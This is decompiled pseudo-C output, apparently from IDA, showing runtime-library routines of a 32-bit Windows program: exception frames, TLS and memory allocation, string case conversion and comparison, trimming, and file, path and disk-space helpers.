int sub_405818()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_405876;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E424 )
  {
    sub_404F80((int)dword_41E048);
    sub_404F80((int)dword_41E214);
    sub_4019C8();
    sub_4043B8((VARIANTARG *)&word_41E40C);
    sub_4043B8(&stru_41E3FC);
    sub_4043B8(&stru_41E3EC);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E048: using guessed type _DWORD dword_41E048[115];
// 41E214: using guessed type _DWORD dword_41E214[115];
// 41E3EC: using guessed type VARIANTARG stru_41E3EC;
// 41E3FC: using guessed type VARIANTARG stru_41E3FC;
// 41E40C: using guessed type __int16 word_41E40C;
// 41E424: using guessed type int dword_41E424;

//----- (00405880) --------------------------------------------------------
int sub_405880()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_405968;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( dword_41E424-- == 0 )
  {
    dword_41E030 = 0;
    dword_41E038 = 0;
    dword_41E03C = 0;
    byte_41E042 = 2;
    byte_41E043 = 2;
    byte_41E044 = 3;
    stru_41E3EC.vt = 0;
    stru_41E3FC.vt = 1;
    word_41E40C = 10;
    dword_41E414 = -2147352572;
    dword_41E3E0 = (int (*)(void))&loc_404028;
    dword_41E3E4 = (int (__stdcall *)(_DWORD))sub_404020;
    dword_41E3E8 = (int (*)(void))&loc_404028;
    if ( (unsigned __int8)sub_402A58() )
      sub_402A88();
    sub_402B4C();
    sub_404E16(dword_41E048, (char *)&dword_405974);
    sub_404E16(dword_41E214, (char *)&dword_405974);
    dword_41E02C = (int)GetCommandLineA();
    dword_41E028 = sub_401214();
    dword_41E020 = GetCurrentThreadId();
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 405974: using guessed type int dword_405974;
// 41E020: using guessed type int dword_41E020;
// 41E028: using guessed type int dword_41E028;
// 41E02C: using guessed type int dword_41E02C;
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;
// 41E03C: using guessed type int dword_41E03C;
// 41E042: using guessed type char byte_41E042;
// 41E043: using guessed type char byte_41E043;
// 41E044: using guessed type char byte_41E044;
// 41E048: using guessed type _DWORD dword_41E048[115];
// 41E214: using guessed type _DWORD dword_41E214[115];
// 41E3E0: using guessed type int (*dword_41E3E0)(void);
// 41E3E4: using guessed type int (__stdcall *dword_41E3E4)(_DWORD);
// 41E3E8: using guessed type int (*dword_41E3E8)(void);
// 41E3EC: using guessed type VARIANTARG stru_41E3EC;
// 41E3FC: using guessed type VARIANTARG stru_41E3FC;
// 41E40C: using guessed type __int16 word_41E40C;
// 41E414: using guessed type int dword_41E414;
// 41E424: using guessed type int dword_41E424;

//----- (004059A0) --------------------------------------------------------
BOOL sub_4059A0()
{
  HLOCAL v0; // eax
  int v1; // ebx
  BOOL result; // eax

  if ( (TlsIndex & 0x80000000) != 0 )
    sub_4034BC(226);
  v0 = LocalAlloc_0(0x40u, 0xCu);
  v1 = (int)v0;
  if ( !v0 )
    sub_4034BC(226);
  result = TlsSetValue(TlsIndex, v0);
  dword_41E4DC = v1;
  return result;
}
// 41E4DC: using guessed type int dword_41E4DC;

//----- (004059F0) --------------------------------------------------------
LPVOID sub_4059F0()
{
  LPVOID result; // eax

  if ( !byte_41E4C8 )
    return (LPVOID)*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex);
  result = TlsGetValue(TlsIndex);
  if ( !result )
  {
    sub_4059A0();
    result = TlsGetValue(TlsIndex);
    if ( !result )
      return (LPVOID)dword_41E4DC;
  }
  return result;
}
// 41E4C8: using guessed type char byte_41E4C8;
// 41E4DC: using guessed type int dword_41E4DC;

//----- (00405A34) --------------------------------------------------------
_DWORD *sub_405A34()
{
  CHAR Filename[268]; // [esp+0h] [ebp-10Ch] BYREF

  GetModuleFileNameA_0(hInst, Filename, 0x105u);
  dword_41C0B4 = (int)sub_404818(Filename);
  if ( !dword_41C0B4 )
    dword_41C0B4 = dword_41C0A8;
  return sub_404B00(&dword_41C0A4);
}
// 41C0A4: using guessed type _DWORD dword_41C0A4;
// 41C0A8: using guessed type int dword_41C0A8;
// 41C0B4: using guessed type int dword_41C0B4;

//----- (00405A80) --------------------------------------------------------
int __usercall sub_405A80@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>)
{
  hInst = GetModuleHandleA_0(0);
  *(&dword_41C0A4 + 1) = hInst;
  *(&dword_41C0A4 + 2) = 0;
  *(&dword_41C0A4 + 3) = 0;
  sub_405A34();
  return sub_4032A0(a1, (int)&dword_41C0A4, a2);
}
// 41C0A4: using guessed type _DWORD dword_41C0A4;

//----- (00405AB4) --------------------------------------------------------
int sub_405AB4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_405AD9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4D8;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4D8: using guessed type int dword_41E4D8;

//----- (00405AE4) --------------------------------------------------------
void sub_405AE4()
{
  --dword_41E4D8;
}
// 41E4D8: using guessed type int dword_41E4D8;

//----- (00405E7C) --------------------------------------------------------
LPVOID __usercall sub_405E7C@<eax>(UINT a1@<eax>, SIZE_T a2@<edx>)
{
  HGLOBAL v2; // eax

  v2 = GlobalAlloc(a1, a2);
  return GlobalLock(v2);
}

//----- (00405E8C) --------------------------------------------------------
LPVOID __usercall sub_405E8C@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *a3@<eax>)
{
  HGLOBAL v3; // eax
  HGLOBAL v5; // [esp-Ch] [ebp-Ch]

  v5 = GlobalHandle(a3);
  GlobalUnlock(v5);
  v3 = GlobalReAlloc(v5, dwBytes, uFlags);
  return GlobalLock(v3);
}

//----- (00405EA8) --------------------------------------------------------
HGLOBAL __usercall sub_405EA8@<eax>(const void *a1@<eax>)
{
  HGLOBAL v2; // [esp-4h] [ebp-4h]

  v2 = GlobalHandle(a1);
  GlobalUnlock(v2);
  return GlobalFree(v2);
}

//----- (00405EBC) --------------------------------------------------------
int sub_405EBC()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_405EE1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4E0;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4E0: using guessed type int dword_41E4E0;

//----- (00405EEC) --------------------------------------------------------
void sub_405EEC()
{
  --dword_41E4E0;
}
// 41E4E0: using guessed type int dword_41E4E0;

//----- (0040618C) --------------------------------------------------------
int sub_40618C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_4061B1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4E4;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4E4: using guessed type int dword_41E4E4;

//----- (004061BC) --------------------------------------------------------
void sub_4061BC()
{
  --dword_41E4E4;
}
// 41E4E4: using guessed type int dword_41E4E4;

//----- (00406CA0) --------------------------------------------------------
unsigned int __userpurge sub_406CA0@<eax>(
        unsigned int result@<eax>,
        unsigned __int16 a2@<dx>,
        _WORD *a3@<ecx>,
        _WORD *a4)
{
  unsigned int v4; // ett

  v4 = result;
  LOWORD(result) = result / a2;
  *a3 = result;
  *a4 = v4 % a2;
  return result;
}

//----- (00406CBC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_406CBC(__int32 a1@<eax>)
{
  DWORD v1; // [esp-10h] [ebp-14h]
  DWORD v2; // [esp-Ch] [ebp-10h]
  DWORD v3; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v4; // [esp-4h] [ebp-8h]

  sub_409450((int)dword_406844, 1, a1);
  sub_402F98(v1, v2, v3, v4);
}
// 406CD3: positive sp value 10 has been found
// 406CCD: variable 'v1' is possibly undefined
// 406CCD: variable 'v2' is possibly undefined
// 406CCD: variable 'v3' is possibly undefined
// 406CCD: variable 'v4' is possibly undefined
// 406844: using guessed type int dword_406844[4];

//----- (00406CD4) --------------------------------------------------------
_DWORD *__usercall sub_406CD4@<eax>(int **a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  DWORD v7; // [esp-14h] [ebp-18h]
  int *v8; // [esp-10h] [ebp-14h]
  const ULONG_PTR *v9; // [esp-Ch] [ebp-10h]
  unsigned int v10; // [esp-8h] [ebp-Ch]
  char *v11; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v11 = 0;
  v8 = &savedregs;
  v7 = (DWORD)&loc_406D26;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_404B80(a1, &v11);
  sub_40948C((int)dword_406844, 1, (unsigned __int8 *)v11, a3, a2);
  sub_402F98((DWORD)ExceptionList, v7, (DWORD)v8, v9);
  __writefsdword(0, v10);
  v11 = (char *)&loc_406D2D;
  return sub_4034C8(&v11);
}
// 406844: using guessed type int dword_406844[4];

//----- (00406D34) --------------------------------------------------------
char *__usercall sub_406D34@<eax>(int a1@<eax>)
{
  char *v2; // esi

  v2 = (char *)sub_402598(a1);
  sub_4028D4(v2, a1, 0);
  return v2;
}

//----- (00406D54) --------------------------------------------------------
_DWORD *__usercall sub_406D54@<eax>(_BYTE *a1@<eax>, char **a2@<edx>)
{
  int v4; // ebx
  _DWORD *result; // eax
  _BYTE *v6; // edx
  char *i; // esi

  v4 = sub_403724((int)a1);
  result = sub_4039FC(a2, v4);
  v6 = a1;
  for ( i = *a2; v4; --v4 )
  {
    LOBYTE(result) = *v6;
    if ( *v6 >= 0x61u && (unsigned __int8)result <= 0x7Au )
      LOBYTE(result) = (_BYTE)result - 32;
    *i = (char)result;
    ++v6;
    ++i;
  }
  return result;
}

//----- (00406D90) --------------------------------------------------------
_DWORD *__usercall sub_406D90@<eax>(_BYTE *a1@<eax>, char **a2@<edx>)
{
  int v4; // ebx
  _DWORD *result; // eax
  _BYTE *v6; // edx
  char *i; // esi

  v4 = sub_403724((int)a1);
  result = sub_4039FC(a2, v4);
  v6 = a1;
  for ( i = *a2; v4; --v4 )
  {
    LOBYTE(result) = *v6;
    if ( *v6 >= 0x41u && (unsigned __int8)result <= 0x5Au )
      LOBYTE(result) = (_BYTE)result + 32;
    *i = (char)result;
    ++v6;
    ++i;
  }
  return result;
}

//----- (00406DCC) --------------------------------------------------------
int __usercall sub_406DCC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, unsigned int a3@<ecx>)
{
  int result; // eax
  unsigned int v6; // edx
  bool v7; // zf
  unsigned int v8; // ecx

  result = 0;
  v6 = a3 & 3;
  v8 = a3 >> 2;
  v7 = v8 == 0;
  do
  {
    if ( !v8 )
      break;
    v7 = *a1++ == *a2++;
    --v8;
  }
  while ( v7 );
  if ( v7 && !memcmp(a1, a2, v6) )
    return 1;
  return result;
}

//----- (00406DEC) --------------------------------------------------------
int __usercall sub_406DEC@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // edi
  _BYTE *v4; // ecx
  bool v5; // zf
  unsigned __int8 v6; // bl
  unsigned __int8 v7; // bh

  v2 = a1;
  v3 = a2;
  if ( a1 )
    a1 = (_BYTE *)*((_DWORD *)a1 - 1);
  if ( a2 )
    a2 = (_BYTE *)*((_DWORD *)a2 - 1);
  v4 = a1;
  if ( a1 > a2 )
    v4 = a2;
  v5 = 1;
  while ( 1 )
  {
    do
    {
      if ( !v4 )
        break;
      v5 = *v2++ == *v3++;
      --v4;
    }
    while ( v5 );
    if ( v5 )
      break;
    v6 = *(v2 - 1);
    if ( v6 >= 0x61u && v6 <= 0x7Au )
      v6 -= 32;
    v7 = *(v3 - 1);
    if ( v7 >= 0x61u && v7 <= 0x7Au )
      v7 -= 32;
    v5 = v6 == v7;
    if ( v6 != v7 )
    {
      a1 = (_BYTE *)v6;
      a2 = (_BYTE *)v7;
      return a1 - a2;
    }
  }
  return a1 - a2;
}

//----- (00406E40) --------------------------------------------------------
char __usercall sub_406E40@<al>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  if ( a1 == a2 )
    goto LABEL_6;
  if ( a1 )
  {
    if ( a2 && *((_DWORD *)a1 - 1) == *((_DWORD *)a2 - 1) && !sub_406DEC(a1, a2) )
    {
LABEL_6:
      LOBYTE(a1) = 1;
      return (char)a1;
    }
    LOBYTE(a1) = 0;
  }
  return (char)a1;
}

//----- (00406E64) --------------------------------------------------------
int __usercall sub_406E64@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-Ch] [ebp-14h]
  char *v7; // [esp-8h] [ebp-10h]
  int v8; // [esp-4h] [ebp-Ch]

  v8 = sub_403724((int)a2);
  v7 = sub_4038E8(a2);
  v6 = sub_403724((int)a1);
  v4 = sub_4038E8(a1);
  return CompareStringA(0x400u, 1u, v4, v6, v7, v8) - 2;
}

//----- (00406E9C) --------------------------------------------------------
_DWORD *__usercall sub_406E9C@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v4; // eax
  int v5; // esi
  int i; // ebx

  v4 = sub_403724(a1);
  v5 = v4;
  for ( i = 1; v4 >= i && *(_BYTE *)(a1 + i - 1) <= 0x20u; ++i )
    ;
  if ( v4 < i )
    return sub_4034C8(a2);
  while ( *(_BYTE *)(a1 + v5 - 1) <= 0x20u )
    --v5;
  return sub_40392C(a1, i, v5 - i + 1, a2);
}

//----- (00406EEC) --------------------------------------------------------
_DWORD *__usercall sub_406EEC@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int i; // ebx

  for ( i = sub_403724(a1); i > 0 && *(_BYTE *)(a1 + i - 1) <= 0x20u; --i )
    ;
  return sub_40392C(a1, 1, i, a2);
}

//----- (00406F20) --------------------------------------------------------
volatile __int32 *__usercall sub_406F20@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>)
{
  unsigned __int8 *v3; // ebx
  int v4; // eax
  unsigned __int8 *v5; // esi
  int i; // edi
  volatile __int32 *result; // eax
  unsigned __int8 *v8; // ebx
  _BYTE *v9; // edi
  _BYTE *v10; // edi
  _BYTE *v11; // edi

  v3 = a1;
  v4 = sub_403724((int)a1);
  v5 = &v3[v4];
  for ( i = 0; v5 > v3; ++v3 )
  {
    if ( *v3 == 10 )
    {
      ++i;
    }
    else if ( *v3 == 13 )
    {
      if ( v3[1] == 10 )
        ++v3;
      else
        ++i;
    }
    else if ( _bittest(dword_41C104, *v3) )
    {
      ++v3;
    }
  }
  if ( !i )
    return sub_40351C(a2, (__int32)a1);
  v8 = a1;
  result = sub_4035B0((char **)a2, 0, i + v5 - a1);
  v9 = (_BYTE *)*a2;
  while ( v5 > v8 )
  {
    LOBYTE(result) = *v8;
    if ( *v8 == 10 )
    {
      *v9 = 13;
      v10 = v9 + 1;
      *v10 = 10;
      v9 = v10 + 1;
      ++v8;
    }
    else if ( *v8 == 13 )
    {
      *v9 = 13;
      v11 = v9 + 1;
      *v11 = 10;
      v9 = v11 + 1;
      if ( *++v8 == 10 )
        ++v8;
    }
    else
    {
      if ( _bittest(dword_41C104, (unsigned __int8)result) )
      {
        *v9++ = (_BYTE)result;
        ++v8;
      }
      LOBYTE(result) = *v8;
      *v9++ = *v8++;
    }
  }
  return result;
}
// 41C104: using guessed type signed __int32 dword_41C104[8];

//----- (00406FEC) --------------------------------------------------------
_DWORD *__usercall sub_406FEC@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // [esp+0h] [ebp-8h] BYREF
  char v4; // [esp+4h] [ebp-4h]

  v3 = a1;
  v4 = 0;
  return sub_407B40(a2, (unsigned __int8 *)&dword_407018, (int)&v3, 0);
}
// 407018: using guessed type int dword_407018;

//----- (0040701C) --------------------------------------------------------
_DWORD *__usercall sub_40701C@<eax>(int a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  int v4; // [esp+0h] [ebp-10h] BYREF
  char v5; // [esp+4h] [ebp-Ch]
  int v6; // [esp+8h] [ebp-8h]
  char v7; // [esp+Ch] [ebp-4h]

  v4 = a2;
  v5 = 0;
  v6 = a1;
  v7 = 0;
  return sub_407B40(a3, "%.*x", (int)&v4, 1);
}

//----- (00407058) --------------------------------------------------------
int __usercall sub_407058@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>)
{
  int result; // eax
  char *v5; // [esp+0h] [ebp-8h] BYREF

  v5 = a3;
  result = sub_402978(a1, &v5);
  if ( v5 )
    return a2;
  return result;
}

//----- (00407070) --------------------------------------------------------
HANDLE __usercall sub_407070@<eax>(char *a1@<eax>, char a2@<dl>)
{
  char *v2; // eax
  DWORD v4; // [esp-18h] [ebp-20h]
  DWORD v5; // [esp-14h] [ebp-1Ch]

  v5 = *(&dwShareMode + ((unsigned __int8)(a2 & 0xF0) >> 4));
  v4 = dwDesiredAccess[a2 & 3];
  v2 = sub_4038E8(a1);
  return CreateFileA_0(v2, v4, v5, 0, 3u, 0x80u, 0);
}
// 41C12C: using guessed type DWORD dwDesiredAccess[3];

//----- (004070B0) --------------------------------------------------------
HANDLE __usercall sub_4070B0@<eax>(char *a1@<eax>)
{
  char *v1; // eax

  v1 = sub_4038E8(a1);
  return CreateFileA_0(v1, 0xC0000000, 0, 0, 2u, 0x80u, 0);
}

//----- (004070D4) --------------------------------------------------------
DWORD __usercall sub_4070D4@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesRead = nNumberOfBytesToRead;
  if ( !ReadFile_0(a3, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return -1;
  return NumberOfBytesRead;
}

//----- (00407100) --------------------------------------------------------
DWORD __usercall sub_407100@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesWritten = nNumberOfBytesToWrite;
  if ( !WriteFile_0(a3, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    return -1;
  return NumberOfBytesWritten;
}

//----- (0040712C) --------------------------------------------------------
DWORD __usercall sub_40712C@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *a3@<eax>)
{
  return SetFilePointer_0(a3, lDistanceToMove, 0, dwMoveMethod);
}

//----- (00407138) --------------------------------------------------------
BOOL __usercall sub_407138@<eax>(void *a1@<eax>)
{
  return CloseHandle_0(a1);
}

//----- (00407140) --------------------------------------------------------
int __usercall sub_407140@<eax>(char *a1@<eax>)
{
  char *v1; // eax
  HANDLE FirstFileA_0; // eax
  struct _WIN32_FIND_DATAA FindFileData; // [esp+4h] [ebp-14Ch] BYREF
  struct _FILETIME LocalFileTime; // [esp+144h] [ebp-Ch] BYREF
  WORD FatDate[2]; // [esp+14Ch] [ebp-4h] BYREF

  v1 = sub_4038E8(a1);
  FirstFileA_0 = FindFirstFileA_0(v1, &FindFileData);
  if ( FirstFileA_0 == (HANDLE)-1
    || (FindClose_0(FirstFileA_0), (FindFileData.dwFileAttributes & 0x10) != 0)
    || (FileTimeToLocalFileTime(&FindFileData.ftLastWriteTime, &LocalFileTime),
        !FileTimeToDosDateTime(&LocalFileTime, &FatDate[1], FatDate)) )
  {
    *(_DWORD *)FatDate = -1;
  }
  return *(_DWORD *)FatDate;
}

//----- (004071A8) --------------------------------------------------------
bool __usercall sub_4071A8@<al>(char *a1@<eax>)
{
  return sub_407140(a1) != -1;
}

//----- (004071B8) --------------------------------------------------------
DWORD __usercall sub_4071B8@<eax>(char *a1@<eax>, DWORD a2@<edx>)
{
  int v2; // ebx
  char *v3; // eax

  v2 = 0;
  v3 = sub_4038E8(a1);
  if ( !SetFileAttributesA(v3, a2) )
    return GetLastError_0();
  return v2;
}

//----- (004071E0) --------------------------------------------------------
DWORD __usercall sub_4071E0@<eax>(int a1@<eax>)
{
  FILETIME FileTime; // [esp+0h] [ebp-Ch] BYREF

  while ( (*(_DWORD *)(a1 + 16) & *(_DWORD *)(a1 + 24)) != 0 )
  {
    if ( !FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
      return GetLastError_0();
  }
  FileTimeToLocalFileTime((const FILETIME *)(a1 + 44), &FileTime);
  FileTimeToDosDateTime(&FileTime, (LPWORD)(a1 + 2), (LPWORD)a1);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a1 + 24);
  sub_4036F8((char **)(a1 + 12), (char *)(a1 + 68), 260);
  return 0;
}

//----- (00407244) --------------------------------------------------------
DWORD __usercall sub_407244@<eax>(char *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  char *v4; // eax
  HANDLE FirstFileA_0; // eax
  DWORD v6; // esi
  struct _WIN32_FIND_DATAA *v8; // [esp-4h] [ebp-10h]

  *(_DWORD *)(a3 + 16) = ~a2 & 0x1E;
  v8 = (struct _WIN32_FIND_DATAA *)(a3 + 24);
  v4 = sub_4038E8(a1);
  FirstFileA_0 = FindFirstFileA_0(v4, v8);
  *(_DWORD *)(a3 + 20) = FirstFileA_0;
  if ( FirstFileA_0 == (HANDLE)-1 )
    return GetLastError_0();
  v6 = sub_4071E0(a3);
  if ( v6 )
    sub_4072B8(a3);
  return v6;
}

//----- (00407294) --------------------------------------------------------
DWORD __usercall sub_407294@<eax>(int a1@<eax>)
{
  if ( FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
    return sub_4071E0(a1);
  else
    return GetLastError_0();
}

//----- (004072B8) --------------------------------------------------------
void *__usercall sub_4072B8@<eax>(int a1@<eax>)
{
  void *result; // eax

  result = *(void **)(a1 + 20);
  if ( result != (void *)-1 )
  {
    result = (void *)FindClose_0(result);
    *(_DWORD *)(a1 + 20) = -1;
  }
  return result;
}

//----- (004072D4) --------------------------------------------------------
int __usercall sub_4072D4@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  int v4; // edi
  char *i; // ebp
  unsigned __int8 v6; // bl

  v4 = sub_403724((int)a2);
  for ( i = sub_4038E8(a1); v4 > 0; --v4 )
  {
    v6 = a2[v4 - 1];
    if ( v6 && sub_407628(i, v6) )
    {
      if ( (unsigned __int8)sub_409D14(a2, v4) != 2 )
        return v4;
      --v4;
    }
  }
  return v4;
}

//----- (00407324) --------------------------------------------------------
_DWORD *__usercall sub_407324@<eax>(char *a1@<eax>, char *a2@<edx>, volatile __int32 *a3@<ecx>)
{
  int v5; // eax
  int v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  char *v10; // [esp+Ch] [ebp-8h] BYREF
  volatile __int32 *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a3;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40739B;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = sub_4072D4((char *)&dword_4073B4, a1);
  v6 = v5;
  if ( !v5 || a1[v5 - 1] != 46 )
    v6 = 0x7FFFFFFF;
  sub_40392C((int)a1, 1, v6 - 1, &v10);
  sub_403770(v11, v10, a2);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4073A2;
  return sub_4034C8(&v10);
}
// 4073B4: using guessed type int dword_4073B4;

//----- (004073B8) --------------------------------------------------------
_DWORD *__usercall sub_4073B8@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = sub_4072D4((char *)&dword_4073E8, a1);
  return sub_40392C((int)a1, 1, v4, a2);
}
// 4073E8: using guessed type int dword_4073E8;

//----- (004073EC) --------------------------------------------------------
_DWORD *__usercall sub_4073EC@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = sub_4072D4((char *)&dword_407420, a1);
  return sub_40392C((int)a1, v4 + 1, 0x7FFFFFFF, a2);
}
// 407420: using guessed type int dword_407420;

//----- (00407424) --------------------------------------------------------
_DWORD *__usercall sub_407424@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  char *v3; // eax
  int ShortPathNameA; // eax
  CHAR szShortPath[268]; // [esp+0h] [ebp-10Ch] BYREF

  v3 = sub_4038E8(a1);
  ShortPathNameA = GetShortPathNameA(v3, szShortPath, 0x104u);
  return sub_4035B0(a2, szShortPath, ShortPathNameA);
}

//----- (0040745C) --------------------------------------------------------
BOOL __stdcall sub_40745C(LPCSTR lpRootPathName, int a2, int a3, int a4)
{
  const CHAR *v4; // eax
  BOOL DiskFreeSpaceA; // ebx
  int v6; // edx
  int v7; // edx
  int v9; // [esp+4h] [ebp-18h]
  DWORD TotalNumberOfClusters; // [esp+Ch] [ebp-10h] BYREF
  DWORD NumberOfFreeClusters; // [esp+10h] [ebp-Ch] BYREF
  DWORD BytesPerSector; // [esp+14h] [ebp-8h] BYREF
  DWORD SectorsPerCluster; // [esp+18h] [ebp-4h] BYREF

  v4 = lpRootPathName;
  if ( !lpRootPathName )
    v4 = 0;
  DiskFreeSpaceA = GetDiskFreeSpaceA(
                     v4,
                     &SectorsPerCluster,
                     &BytesPerSector,
                     &NumberOfFreeClusters,
                     &TotalNumberOfClusters);
  v9 = BytesPerSector * SectorsPerCluster;
  *(_DWORD *)a2 = sub_405590(BytesPerSector * SectorsPerCluster, NumberOfFreeClusters, 0);
  *(_DWORD *)(a2 + 4) = v6;
  *(_DWORD *)a3 = sub_405590(v9, TotalNumberOfClusters, 0);
  *(_DWORD *)(a3 + 4) = v7;
  return DiskFreeSpaceA;
}
// 4074A9: variable 'v6' is possibly undefined
// 4074C3: variable 'v7' is possibly undefined

//----- (004074D0) --------------------------------------------------------
int __usercall sub_4074D0@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>)
{
  char *v3; // esi
  char v5; // [esp+0h] [ebp-Ch] BYREF
  char v6[4]; // [esp+1h] [ebp-Bh] BYREF

  v3 = 0;
  if ( a1 )
  {
    v5 = a1 + 64;
    strcpy(v6, ":\\");
    v3 = &v5;
  }
  return dword_41C128(v3, a3, a2, 0);
}
// 41C128: using guessed type int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00407500) --------------------------------------------------------
__int64 __usercall sub_407500@<edx:eax>(char a1@<al>)
{
  __int64 v2; // [esp+0h] [ebp-14h] BYREF
  char v3[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !sub_4074D0(a1, (int)v3, (int)&v2) )
    return -1i64;
  return v2;
}
// 407500: using guessed type char var_C[12];

//----- (00407534) --------------------------------------------------------
unsigned int __usercall sub_407534@<eax>(const char *a1@<eax>)
{
  return strlen(a1);
}

//----- (0040754C) --------------------------------------------------------
char *__usercall sub_40754C@<eax>(char *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  char *v5; // esi
  char *v6; // edi
  unsigned int i; // ecx
  char *v8; // esi
  char *v9; // edi
  unsigned int j; // ecx

  if ( result > a2 )
  {
    v5 = &a2[a3 - 1];
    v6 = &result[a3 - 1];
    for ( i = a3 & 3; i; --i )
      *v6-- = *v5--;
    v8 = v5 - 3;
    v9 = v6 - 3;
    for ( j = a3 >> 2; j; --j )
    {
      *(_DWORD *)v9 = *(_DWORD *)v8;
      v8 -= 4;
      v9 -= 4;
    }
  }
  else if ( result != a2 )
  {
    qmemcpy(result, a2, a3);
  }
  return result;
}

//----- (00407588) --------------------------------------------------------
char *__usercall sub_407588@<eax>(char *result@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _BYTE *v3; // edi
  int v4; // ebx
  bool v5; // zf
  unsigned int v6; // ebx
  char *v7; // edi
  int v8; // ecx

  v3 = a2;
  v4 = a3;
  v5 = a3 == 0;
  if ( a3 )
  {
    do
    {
      if ( !a3 )
        break;
      v5 = *v3++ == 0;
      --a3;
    }
    while ( !v5 );
    if ( v5 )
      ++a3;
  }
  v6 = v4 - a3;
  qmemcpy(result, a2, 4 * (v6 >> 2));
  v7 = &result[4 * (v6 >> 2)];
  v8 = v6 & 3;
  qmemcpy(v7, &a2[4 * (v6 >> 2)], v8);
  v7[v8] = 0;
  return result;
}

